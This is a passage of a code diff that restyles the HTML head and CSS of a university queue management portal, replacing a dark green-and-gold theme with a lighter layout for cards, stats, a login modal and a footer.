@@ -1,901 +1,475 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Makerere University — Queue Management System</title>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700;900&family=Source+Sans+3:wght@300;400;500;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --green-dark: #0f2318;
-            --green-mid: #1a3c2c;
-            --green-bright: #2a5a3a;
-            --green-light: #3d7a50;
-            --gold: #c9a227;
-            --gold-light: #e8c547;
-            --gold-pale: #f5e6a3;
-            --cream: #faf8f2;
-            --cream-dark: #f0ece0;
-            --text-dark: #0f1f16;
-            --text-mid: #2c4a38;
-            --text-muted: #6b8c78;
-            --white: #ffffff;
-            --border: rgba(201,162,39,0.25);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Makerere University — Queue Management System</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+--ink:#0c0e0b;--surface:#f7f6f2;--white:#ffffff;
+--mak-green:#155c30;--mak-green-mid:#1e7d43;--mak-green-light:#e8f4ed;
+--mak-gold:#b8890a;--mak-gold-light:#fdf3d8;--mak-gold-bright:#d4aa00;
+--red:#c0392b;--red-light:#fdf0ef;--blue:#1a3fa0;--blue-light:#edf1fb;
+--purple:#5c3b9e;--purple-light:#f2eefb;
+--border:#e2e0da;--muted:#6b7280;--muted2:#9ca3af;
+--shadow-sm:0 1px 3px rgba(0,0,0,.08);
+--shadow-md:0 4px 16px rgba(0,0,0,.10);
+--shadow-lg:0 12px 40px rgba(0,0,0,.13);
+--r:10px;--r-lg:16px;
+}
+html{scroll-behavior:smooth}
+body{font-family:'DM Sans',sans-serif;background:var(--surface);color:var(--ink);line-height:1.6;font-size:15px;-webkit-font-smoothing:antialiased}
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+/* ── skip link ── */
+.skip{position:absolute;top:-99px;left:16px;background:var(--mak-gold);color:#fff;font-weight:600;padding:10px 20px;border-radius:8px;z-index:9999;transition:top .2s;text-decoration:none;font-size:14px}
+.skip:focus{top:12px}
 
-        body {
-            font-family: 'Source Sans 3', Georgia, sans-serif;
-            background: var(--green-dark);
-            color: var(--white);
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
+/* ── top ribbon ── */
+.ribbon{background:var(--mak-green);color:rgba(255,255,255,.9);border-bottom:2px solid var(--mak-gold-bright);padding:0 32px;min-height:48px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.ribbon-ticker{display:flex;align-items:center;gap:12px;flex:1;overflow:hidden}
+.live-badge{display:inline-flex;align-items:center;gap:6px;background:var(--red);color:#fff;font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:4px 12px;border-radius:30px;flex-shrink:0}
+.live-dot{width:8px;height:8px;background:#fff;border-radius:50%;animation:pulse 1.4s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
+.ribbon-text{font-size:12.5px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:.85}
+.ribbon-nav{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.ribbon-nav a{display:inline-flex;align-items:center;gap:6px;color:rgba(255,255,255,.85);text-decoration:none;font-size:12px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;padding:6px 14px;border-radius:6px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);transition:all .2s}
+.ribbon-nav a:hover{background:rgba(255,255,255,.18);color:#fff;transform:translateY(-1px)}
+.ribbon-nav a svg{width:14px;height:14px;fill:currentColor}
 
-        /* ─── TEXTURE OVERLAY ─── */
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background-image:
-                repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(255,255,255,0.012) 40px, rgba(255,255,255,0.012) 41px),
-                repeating-linear-gradient(90deg, transparent, transparent 40px, rgba(255,255,255,0.012) 40px, rgba(255,255,255,0.012) 41px);
-            pointer-events: none; z-index: 0;
-        }
+/* ── header ── */
+.header{background:var(--white);border-bottom:3px solid var(--mak-gold-bright);padding:16px 32px;position:sticky;top:0;z-index:100;box-shadow:var(--shadow-sm)}
+.header-inner{max-width:1320px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;gap:20px}
+.brand{display:flex;align-items:center;gap:14px;text-decoration:none}
+.brand-shield{width:52px;height:52px;background:linear-gradient(145deg,var(--mak-gold-bright),var(--mak-gold));border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(184,137,10,.3)}
+.brand-shield svg{width:26px;height:26px;fill:var(--mak-green)}
+.brand-copy{line-height:1.2}
+.brand-name{font-family:'DM Serif Display',serif;font-size:21px;color:var(--mak-green);letter-spacing:-.2px}
+.brand-name span{color:var(--mak-gold)}
+.brand-tagline{font-size:10px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-top:2px}
+.header-clock{text-align:right}
+.clock-time{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;color:var(--mak-green)}
+.clock-loc{font-size:11px;color:var(--muted);margin-top:2px}
 
-        /* ─── TOP BAR ─── */
-        .topbar {
-            background: var(--green-dark);
-            border-bottom: 1px solid rgba(201,162,39,0.3);
-            padding: 8px 40px;
-            display: flex; align-items: center; justify-content: space-between;
-            position: relative; z-index: 10;
-        }
-        .topbar-left { font-size: 12px; color: rgba(255,255,255,0.5); letter-spacing: 0.5px; }
-        .topbar-right { display: flex; gap: 24px; align-items: center; }
-        .topbar-right a {
-            font-size: 11.5px; color: rgba(255,255,255,0.45);
-            text-decoration: none; letter-spacing: 0.4px; transition: color 0.2s;
-        }
-        .topbar-right a:hover { color: var(--gold-light); }
-        .topbar-divider { width: 1px; height: 14px; background: rgba(255,255,255,0.15); }
+/* ── hero ── */
+.hero{background:linear-gradient(150deg,var(--mak-green) 0%,#0e4723 40%,#1a5e35 100%);color:#fff;padding:80px 32px 88px;position:relative;overflow:hidden}
+.hero::after{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 55% 80% at 85% 50%,rgba(212,170,0,.15),transparent 65%);pointer-events:none}
+.hero-inner{max-width:800px;margin:0 auto;text-align:center;position:relative;z-index:1}
+.hero-kicker{display:inline-flex;align-items:center;gap:8px;border:1px solid rgba(212,170,0,.4);background:rgba(212,170,0,.1);color:rgba(255,255,255,.85);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;padding:6px 18px;border-radius:30px;margin-bottom:28px}
+.hero-kicker-dot{width:5px;height:5px;background:var(--mak-gold-bright);border-radius:50%}
+.hero-h1{font-family:'DM Serif Display',serif;font-size:clamp(38px,7vw,68px);line-height:1.08;letter-spacing:-1.5px;margin-bottom:22px}
+.hero-h1 em{font-style:italic;color:var(--mak-gold-bright)}
+.hero-desc{font-size:17px;line-height:1.75;color:rgba(255,255,255,.78);max-width:580px;margin:0 auto 38px}
+.hero-actions{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn-gold{display:inline-flex;align-items:center;gap:8px;background:var(--mak-gold-bright);color:var(--mak-green);font-weight:700;font-size:14px;padding:13px 28px;border-radius:var(--r);border:2px solid var(--mak-gold-bright);text-decoration:none;transition:all .2s;cursor:pointer}
+.btn-gold:hover{background:#e8c500;transform:translateY(-2px);box-shadow:0 8px 24px rgba(212,170,0,.35)}
+.btn-outline{display:inline-flex;align-items:center;gap:8px;background:transparent;color:rgba(255,255,255,.88);font-weight:600;font-size:14px;padding:13px 28px;border-radius:var(--r);border:2px solid rgba(255,255,255,.28);text-decoration:none;transition:all .2s;cursor:pointer}
+.btn-outline:hover{border-color:rgba(255,255,255,.65);background:rgba(255,255,255,.07);transform:translateY(-2px)}
+.btn-gold svg,.btn-outline svg{width:16px;height:16px;fill:currentColor}
 
-        /* ─── HEADER ─── */
-        .header {
-            position: relative; z-index: 5;
-            background: linear-gradient(180deg, rgba(0,0,0,0.45) 0%, transparent 100%);
-            padding: 36px 40px 30px;
-            display: flex; align-items: center; gap: 28px;
-            border-bottom: 1px solid rgba(201,162,39,0.2);
-        }
-        .coat-of-arms {
-            width: 80px; height: 80px; flex-shrink: 0;
-            background: radial-gradient(circle at 50% 40%, var(--gold) 0%, #a07c18 100%);
-            border-radius: 50%; border: 3px solid var(--gold);
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 0 6px rgba(201,162,39,0.15), 0 8px 32px rgba(0,0,0,0.4);
-            position: relative; overflow: hidden;
-        }
-        .coat-of-arms svg { width: 44px; height: 44px; fill: var(--green-dark); }
+/* ── stats ── */
+.stats-row{background:var(--white);border-bottom:1px solid var(--border);box-shadow:var(--shadow-sm)}
+.stats-inner{max-width:1320px;margin:0 auto;padding:0 32px;display:grid;grid-template-columns:repeat(4,1fr)}
+.stat-cell{padding:26px 20px;text-align:center;border-right:1px solid var(--border);position:relative}
+.stat-cell:last-child{border-right:none}
+.stat-cell::after{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:28px;height:3px;border-radius:0 0 4px 4px}
+.s-wait::after{background:var(--mak-gold-bright)}
+.s-serve::after{background:var(--mak-green-mid)}
+.s-done::after{background:var(--blue)}
+.s-offices::after{background:var(--purple)}
+.stat-number{font-family:'DM Serif Display',serif;font-size:44px;line-height:1;color:var(--mak-green);margin-bottom:6px}
+.stat-label{font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--muted)}
+.stat-badge{display:inline-block;font-size:10px;font-weight:600;letter-spacing:.5px;margin-top:6px;padding:2px 10px;border-radius:30px}
+.sb-wait{background:var(--mak-gold-light);color:var(--mak-gold)}
+.sb-serve{background:var(--mak-green-light);color:var(--mak-green)}
+.sb-done{background:var(--blue-light);color:var(--blue)}
+.sb-office{background:var(--purple-light);color:var(--purple)}
 
-        .header-text { flex: 1; }
-        .header-institution {
-            font-family: 'Playfair Display', Georgia, serif;
-            font-size: 30px; font-weight: 700;
-            letter-spacing: 3px; text-transform: uppercase;
-            color: var(--white);
-            line-height: 1.1;
-        }
-        .header-institution span { color: var(--gold); }
-        .header-system {
-            font-size: 13px; color: rgba(255,255,255,0.55);
-            letter-spacing: 2.5px; text-transform: uppercase;
-            margin-top: 6px; font-weight: 400;
-        }
+/* ── main content ── */
+.main{max-width:1320px;margin:0 auto;padding:52px 32px 72px}
 
-        .header-meta {
-            text-align: right;
-        }
-        .live-badge {
-            display: inline-flex; align-items: center; gap: 6px;
-            background: rgba(0,200,83,0.12); border: 1px solid rgba(0,200,83,0.35);
-            color: #4cde8c; font-size: 11px; font-weight: 600; letter-spacing: 1px;
-            padding: 5px 12px; border-radius: 4px; text-transform: uppercase; margin-bottom: 8px;
-        }
-        .live-dot { width: 6px; height: 6px; background: #4cde8c; border-radius: 50%; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%,100%{ opacity:1; transform:scale(1); } 50%{ opacity:0.4; transform:scale(1.4); } }
-        .header-time { font-size: 11.5px; color: rgba(255,255,255,0.4); }
+.section-head{display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid var(--mak-gold-bright);padding-bottom:10px;margin-bottom:32px;flex-wrap:wrap;gap:10px}
+.section-head h2{font-family:'DM Serif Display',serif;font-size:24px;color:var(--mak-green)}
+.section-head a{font-size:12px;font-weight:600;color:var(--muted);text-decoration:none;letter-spacing:.5px;text-transform:uppercase;transition:color .2s}
+.section-head a:hover{color:var(--mak-gold)}
 
-        /* ─── HERO BANNER ─── */
-        .hero {
-            position: relative; z-index: 5;
-            padding: 60px 40px 50px;
-            text-align: center;
-            background: linear-gradient(180deg, rgba(15,35,24,0) 0%, rgba(26,60,44,0.6) 100%);
-        }
-        .hero-eyebrow {
-            font-size: 11px; letter-spacing: 4px; text-transform: uppercase;
-            color: var(--gold); font-weight: 600; margin-bottom: 18px;
-            display: flex; align-items: center; justify-content: center; gap: 12px;
-        }
-        .hero-eyebrow::before, .hero-eyebrow::after {
-            content: ''; width: 50px; height: 1px; background: var(--gold); opacity: 0.5;
-        }
-        .hero-title {
-            font-family: 'Playfair Display', Georgia, serif;
-            font-size: 52px; font-weight: 900; line-height: 1.1;
-            color: var(--white); margin-bottom: 20px;
-            text-shadow: 0 4px 24px rgba(0,0,0,0.4);
-        }
-        .hero-title em { color: var(--gold); font-style: normal; }
-        .hero-subtitle {
-            font-size: 17px; color: rgba(255,255,255,0.65); max-width: 580px; margin: 0 auto 40px;
-            font-weight: 300; line-height: 1.7;
-        }
+/* ── portal cards ── */
+.portals{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin-bottom:60px}
+.card{background:var(--white);border:1px solid var(--border);border-radius:var(--r-lg);padding:32px 24px 28px;display:flex;flex-direction:column;align-items:center;text-align:center;text-decoration:none;color:inherit;cursor:pointer;transition:transform .25s,box-shadow .25s;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;opacity:0;transition:opacity .25s}
+.card:hover,.card:focus-within{transform:translateY(-5px);box-shadow:var(--shadow-lg)}
+.card:hover::before,.card:focus-within::before{opacity:1}
+.card.c-token::before{background:linear-gradient(90deg,var(--mak-green),var(--mak-green-mid))}
+.card.c-officer::before{background:linear-gradient(90deg,var(--mak-gold),var(--mak-gold-bright))}
+.card.c-display::before{background:linear-gradient(90deg,var(--red),#e74c3c)}
+.card.c-admin::before{background:linear-gradient(90deg,var(--purple),#7d5bbf)}
+.card:focus{outline:3px solid var(--mak-gold);outline-offset:2px}
+.card-icon{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px}
+.card-icon svg{width:30px;height:30px;fill:#fff}
+.ci-green{background:linear-gradient(145deg,var(--mak-green-mid),var(--mak-green))}
+.ci-gold{background:linear-gradient(145deg,var(--mak-gold-bright),var(--mak-gold))}
+.ci-red{background:linear-gradient(145deg,#e74c3c,var(--red))}
+.ci-purple{background:linear-gradient(145deg,#8e5fd8,var(--purple))}
+.card-title{font-size:17px;font-weight:700;margin-bottom:8px;color:var(--ink)}
+.card-body{font-size:13.5px;color:var(--muted);line-height:1.65;flex:1;margin-bottom:18px}
+.chip{display:inline-flex;align-items:center;font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;padding:4px 12px;border-radius:30px}
+.chip-green{background:var(--mak-green-light);color:var(--mak-green)}
+.chip-gold{background:var(--mak-gold-light);color:var(--mak-gold)}
+.chip-red{background:var(--red-light);color:var(--red)}
+.chip-purple{background:var(--purple-light);color:var(--purple)}
 
-        /* STATS ROW */
-        .stats-row {
-            display: flex; justify-content: center; gap: 0;
-            max-width: 700px; margin: 0 auto 60px;
-            border: 1px solid var(--border); border-radius: 12px; overflow: hidden;
-            background: rgba(255,255,255,0.04);
-        }
-        .stat-item {
-            flex: 1; padding: 18px 20px; text-align: center;
-            border-right: 1px solid var(--border);
-        }
-        .stat-item:last-child { border-right: none; }
-        .stat-num {
-            font-family: 'Playfair Display', serif; font-size: 28px; font-weight: 700;
-            color: var(--gold); line-height: 1;
-        }
-        .stat-desc { font-size: 11px; color: rgba(255,255,255,0.45); margin-top: 4px; letter-spacing: 0.5px; }
+/* ── info layout ── */
+.info-grid{display:grid;grid-template-columns:1fr 360px;gap:28px}
+.info-panel{background:var(--white);border:1px solid var(--border);border-radius:var(--r-lg);padding:32px}
+.panel-title{font-family:'DM Serif Display',serif;font-size:20px;color:var(--mak-green);padding-bottom:14px;border-bottom:2px solid var(--mak-gold-bright);margin-bottom:24px}
 
-        /* ─── SECTION LABEL ─── */
-        .section-label {
-            text-align: center; margin-bottom: 36px;
-        }
-        .section-label h2 {
-            font-family: 'Playfair Display', serif; font-size: 13px; font-weight: 400;
-            letter-spacing: 4px; text-transform: uppercase; color: var(--gold);
-            display: flex; align-items: center; justify-content: center; gap: 14px;
-        }
-        .section-label h2::before, .section-label h2::after {
-            content: ''; flex: 1; max-width: 80px; height: 1px;
-            background: linear-gradient(90deg, transparent, var(--gold) 50%, transparent);
-            opacity: 0.5;
-        }
+.steps{display:flex;flex-direction:column}
+.step{display:flex;gap:16px;padding:18px 0;border-bottom:1px solid var(--border)}
+.step:last-child{border-bottom:none;padding-bottom:0}
+.step-num{width:34px;height:34px;background:var(--mak-gold-bright);color:var(--mak-green);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;flex-shrink:0;margin-top:1px}
+.step-title{font-weight:700;font-size:14.5px;margin-bottom:3px}
+.step-desc{font-size:13px;color:var(--muted);line-height:1.6}
 
-        /* ─── CARDS ─── */
-        .cards-wrapper {
-            position: relative; z-index: 5;
-            max-width: 1180px; margin: 0 auto;
-            padding: 0 40px 60px;
-        }
+.hours-table{width:100%;border-collapse:collapse;font-size:14px}
+.hours-table tr{border-bottom:1px solid var(--border)}
+.hours-table tr:last-child{border-bottom:none}
+.hours-table td{padding:10px 0;vertical-align:middle}
+.hours-table td:last-child{text-align:right;font-weight:600}
+.open{color:var(--mak-green)}
+.closed{color:var(--red)}
 
-        .cards-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 22px;
-            margin-bottom: 22px;
-        }
-        .cards-bottom {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 22px;
-            max-width: 760px; margin: 0 auto;
-        }
+.contact-list{margin-top:24px;padding-top:20px;border-top:1px solid var(--border)}
+.contact-item{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px}
+.contact-icon{width:32px;height:32px;background:var(--mak-green);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.contact-icon svg{width:15px;height:15px;fill:var(--mak-gold-bright)}
+.contact-label{font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:var(--muted);margin-bottom:2px}
+.contact-value{font-size:13.5px;font-weight:500}
+.contact-value a{color:var(--mak-green);text-decoration:none}
+.contact-value a:hover{text-decoration:underline}
 
-        .portal-card {
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 16px;
-            padding: 32px 28px;
-            text-decoration: none; color: inherit;
-            display: block;
-            position: relative; overflow: hidden;
-            transition: transform 0.3s cubic-bezier(.2,.8,.2,1), border-color 0.3s, background 0.3s;
-        }
-        .portal-card::before {
-            content: '';
-            position: absolute; inset: 0;
-            background: linear-gradient(135deg, rgba(255,255,255,0.06) 0%, transparent 60%);
-            opacity: 0; transition: opacity 0.3s;
-        }
-        .portal-card:hover { transform: translateY(-6px); border-color: var(--gold); background: rgba(255,255,255,0.07); }
-        .portal-card:hover::before { opacity: 1; }
+/* ── a11y strip ── */
+.a11y{background:var(--mak-green);color:rgba(255,255,255,.85);padding:16px 32px;margin-top:56px}
+.a11y-inner{max-width:1320px;margin:0 auto;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.a11y-icon{width:36px;height:36px;background:rgba(212,170,0,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.a11y-icon svg{width:20px;height:20px;fill:var(--mak-gold-bright)}
+.a11y-text{flex:1;font-size:13px;line-height:1.65}
+.a11y-text strong{color:var(--mak-gold-bright)}
 
-        .portal-card.featured {
-            border-color: rgba(201,162,39,0.45);
-            background: rgba(201,162,39,0.06);
-        }
-        .portal-card.featured::after {
-            content: 'Primary Access';
-            position: absolute; top: 16px; right: 16px;
-            font-size: 9.5px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
-            color: var(--gold); background: rgba(201,162,39,0.15);
-            border: 1px solid rgba(201,162,39,0.35); padding: 3px 10px; border-radius: 20px;
-        }
+/* ── footer ── */
+.footer{background:#111413;color:rgba(255,255,255,.6)}
+.footer-top{max-width:1320px;margin:0 auto;padding:52px 32px 44px;display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:44px}
+.footer-brand{display:flex;align-items:center;gap:12px;margin-bottom:16px}
+.footer-logo{width:38px;height:38px;background:linear-gradient(145deg,var(--mak-gold-bright),var(--mak-gold));border-radius:50%;display:flex;align-items:center;justify-content:center}
+.footer-logo svg{width:20px;height:20px;fill:var(--mak-green)}
+.footer-name{font-family:'DM Serif Display',serif;font-size:17px;color:#fff;line-height:1.2}
+.footer-name small{display:block;font-family:'DM Sans',sans-serif;font-size:10px;color:rgba(255,255,255,.4);font-weight:400}
+.footer-desc{font-size:12.5px;line-height:1.7;max-width:260px}
+.footer-col-title{font-size:11px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:#fff;margin-bottom:16px}
+.footer-col a{display:block;color:rgba(255,255,255,.55);text-decoration:none;font-size:13px;margin-bottom:9px;transition:color .2s}
+.footer-col a:hover{color:var(--mak-gold-bright)}
+.footer-bottom{border-top:1px solid rgba(255,255,255,.07);padding:18px 32px}
+.footer-bottom-inner{max-width:1320px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap}
+.footer-bottom p{font-size:12px}
+.footer-links{display:flex;gap:18px}
+.footer-links a{color:rgba(255,255,255,.45);text-decoration:none;font-size:12px;transition:color .2s}
+.footer-links a:hover{color:var(--mak-gold-bright)}
 
-        .card-accent-line {
-            width: 36px; height: 3px; border-radius: 2px;
-            margin-bottom: 22px; transition: width 0.3s;
-        }
-        .portal-card:hover .card-accent-line { width: 56px; }
-        .accent-blue { background: #3b82f6; }
-        .accent-gold { background: var(--gold); }
-        .accent-emerald { background: #10b981; }
-        .accent-violet { background: #8b5cf6; }
+/* ── modal ── */
+.modal-backdrop{display:none;position:fixed;inset:0;background:rgba(10,26,17,.82);z-index:500;align-items:center;justify-content:center;padding:20px}
+.modal-backdrop.open{display:flex}
+.modal{background:var(--white);border-radius:var(--r-lg);padding:40px 36px;max-width:400px;width:100%;position:relative;box-shadow:var(--shadow-lg)}
+.modal-close{position:absolute;top:14px;right:14px;background:var(--surface);border:none;width:30px;height:30px;border-radius:50%;font-size:18px;cursor:pointer;color:var(--muted);display:flex;align-items:center;justify-content:center;transition:background .2s}
+.modal-close:hover{background:var(--border)}
+.modal-icon{width:56px;height:56px;background:linear-gradient(145deg,var(--mak-green-mid),var(--mak-green));border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
+.modal-icon svg{width:28px;height:28px;fill:var(--mak-gold-bright)}
+.modal h3{font-family:'DM Serif Display',serif;font-size:22px;text-align:center;color:var(--mak-green);margin-bottom:4px}
+.modal-sub{text-align:center;font-size:12.5px;color:var(--muted);margin-bottom:24px}
+.modal-err{display:none;background:#fef2f2;border:1px solid #fecaca;color:var(--red);padding:10px 14px;border-radius:8px;font-size:13px;margin-bottom:16px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:11.5px;font-weight:600;color:var(--ink);margin-bottom:6px;letter-spacing:.3px}
+.field input{width:100%;padding:11px 14px;border:1.5px solid var(--border);border-radius:8px;font-size:14px;font-family:'DM Sans',sans-serif;color:var(--ink);background:var(--surface);transition:border-color .2s,box-shadow .2s}
+.field input:focus{outline:none;border-color:var(--mak-green);box-shadow:0 0 0 3px rgba(21,92,48,.12);background:#fff}
+.modal-btn{width:100%;padding:13px;background:linear-gradient(135deg,var(--mak-green-mid),var(--mak-green));color:#fff;border:none;border-radius:8px;font-weight:700;font-size:15px;cursor:pointer;font-family:'DM Sans',sans-serif;margin-top:6px;transition:opacity .2s,transform .15s}
+.modal-btn:hover{opacity:.9;transform:translateY(-1px)}
+.modal-btn:disabled{opacity:.55;cursor:not-allowed;transform:none}
 
-        .card-icon-wrap {
-            width: 52px; height: 52px; border-radius: 12px;
-            display: flex; align-items: center; justify-content: center;
-            margin-bottom: 20px;
-        }
-        .icon-blue { background: rgba(59,130,246,0.15); border: 1px solid rgba(59,130,246,0.3); }
-        .icon-gold { background: rgba(201,162,39,0.15); border: 1px solid rgba(201,162,39,0.3); }
-        .icon-emerald { background: rgba(16,185,129,0.15); border: 1px solid rgba(16,185,129,0.3); }
-        .icon-violet { background: rgba(139,92,246,0.15); border: 1px solid rgba(139,92,246,0.3); }
+/* ── toast ── */
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(14px);background:var(--mak-green);color:#fff;padding:11px 22px;border-radius:8px;font-size:14px;font-weight:600;z-index:999;opacity:0;pointer-events:none;transition:opacity .3s,transform .3s;box-shadow:var(--shadow-md);min-width:200px;text-align:center}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 
-        .card-icon-wrap svg { width: 26px; height: 26px; }
-        .svg-blue { fill: #60a5fa; }
-        .svg-gold { fill: var(--gold-light); }
-        .svg-emerald { fill: #34d399; }
-        .svg-violet { fill: #a78bfa; }
-
-        .card-title {
-            font-family: 'Playfair Display', serif;
-            font-size: 20px; font-weight: 700;
-            color: var(--white); margin-bottom: 10px; line-height: 1.2;
-        }
-        .card-desc {
-            font-size: 13.5px; color: rgba(255,255,255,0.55);
-            line-height: 1.65; margin-bottom: 22px;
-        }
-        .card-services {
-            list-style: none; margin-bottom: 22px;
-        }
-        .card-services li {
-            font-size: 12px; color: rgba(255,255,255,0.4);
-            padding: 4px 0; display: flex; align-items: center; gap: 7px;
-        }
-        .card-services li::before {
-            content: ''; width: 4px; height: 4px; border-radius: 50%;
-            background: var(--gold); opacity: 0.5; flex-shrink: 0;
-        }
-
-        .card-cta {
-            display: flex; align-items: center; gap: 8px;
-            font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.7);
-            transition: color 0.2s, gap 0.2s;
-        }
-        .portal-card:hover .card-cta { color: var(--gold); gap: 12px; }
-        .card-cta svg { width: 14px; height: 14px; fill: currentColor; transition: transform 0.2s; }
-        .portal-card:hover .card-cta svg { transform: translateX(3px); }
-
-        /* ─── INFO STRIP ─── */
-        .info-strip {
-            position: relative; z-index: 5;
-            background: rgba(201,162,39,0.08);
-            border-top: 1px solid rgba(201,162,39,0.2);
-            border-bottom: 1px solid rgba(201,162,39,0.2);
-            padding: 22px 40px;
-            display: flex; align-items: center; justify-content: center; gap: 48px;
-            flex-wrap: wrap; margin: 0 0 0;
-        }
-        .info-item {
-            display: flex; align-items: center; gap: 11px;
-        }
-        .info-icon {
-            width: 34px; height: 34px; border-radius: 8px;
-            background: rgba(201,162,39,0.15); display: flex; align-items: center; justify-content: center;
-            flex-shrink: 0;
-        }
-        .info-icon svg { width: 16px; height: 16px; fill: var(--gold); }
-        .info-text-label { font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 0.8px; text-transform: uppercase; }
-        .info-text-val { font-size: 13.5px; color: rgba(255,255,255,0.8); font-weight: 500; }
-
-        /* ─── ADMIN MODAL ─── */
-        .modal-overlay {
-            display: none; position: fixed; inset: 0;
-            background: rgba(0,0,0,0.75); z-index: 1000;
-            align-items: center; justify-content: center;
-            backdrop-filter: blur(4px);
-        }
-        .modal-overlay.open { display: flex; }
-        .modal-box {
-            background: #0f2318;
-            border: 1px solid rgba(201,162,39,0.35);
-            border-radius: 20px; padding: 40px 36px;
-            width: 420px; max-width: 94%;
-            box-shadow: 0 40px 80px rgba(0,0,0,0.6);
-            animation: modalIn 0.3s cubic-bezier(.2,.8,.2,1);
-        }
-        @keyframes modalIn { from{ transform:translateY(20px);opacity:0; } to{ transform:translateY(0);opacity:1; } }
-        .modal-coat {
-            width: 52px; height: 52px; border-radius: 50%;
-            background: radial-gradient(circle, var(--gold) 0%, #a07c18 100%);
-            border: 2px solid rgba(201,162,39,0.5);
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 18px;
-        }
-        .modal-coat svg { width: 26px; height: 26px; fill: var(--green-dark); }
-        .modal-title {
-            font-family: 'Playfair Display', serif;
-            font-size: 22px; font-weight: 700; color: var(--white);
-            text-align: center; margin-bottom: 6px;
-        }
-        .modal-subtitle { font-size: 13px; color: rgba(255,255,255,0.45); text-align: center; margin-bottom: 28px; letter-spacing: 0.3px; }
-        .modal-divider { height: 1px; background: var(--border); margin-bottom: 24px; }
-
-        .form-group { margin-bottom: 16px; }
-        .form-group label {
-            display: block; font-size: 11.5px; font-weight: 600; letter-spacing: 0.8px;
-            text-transform: uppercase; color: rgba(255,255,255,0.45); margin-bottom: 7px;
-        }
-        .form-group input {
-            width: 100%; padding: 12px 14px;
-            background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12);
-            border-radius: 9px; font-size: 14px; font-family: inherit;
-            color: white; outline: none; transition: border-color 0.2s, background 0.2s;
-        }
-        .form-group input::placeholder { color: rgba(255,255,255,0.25); }
-        .form-group input:focus { border-color: var(--gold); background: rgba(255,255,255,0.09); }
-        .form-group input[type="password"] { letter-spacing: 2px; }
-
-        .modal-btn {
-            width: 100%; padding: 13px; margin-top: 6px;
-            background: linear-gradient(135deg, var(--gold) 0%, #a07c18 100%);
-            color: var(--green-dark); border: none; border-radius: 9px;
-            font-size: 14px; font-weight: 700; letter-spacing: 0.5px; cursor: pointer;
-            transition: opacity 0.2s, transform 0.15s;
-        }
-        .modal-btn:hover { opacity: 0.9; transform: translateY(-1px); }
-        .modal-close {
-            position: absolute; top: 18px; right: 20px;
-            background: none; border: none; color: rgba(255,255,255,0.35);
-            font-size: 20px; cursor: pointer; line-height: 1;
-            transition: color 0.2s;
-        }
-        .modal-close:hover { color: white; }
-        .modal-box { position: relative; }
-        .modal-error {
-            background: rgba(244,67,54,0.12); border: 1px solid rgba(244,67,54,0.3);
-            color: #ef9a9a; font-size: 13px; padding: 10px 13px;
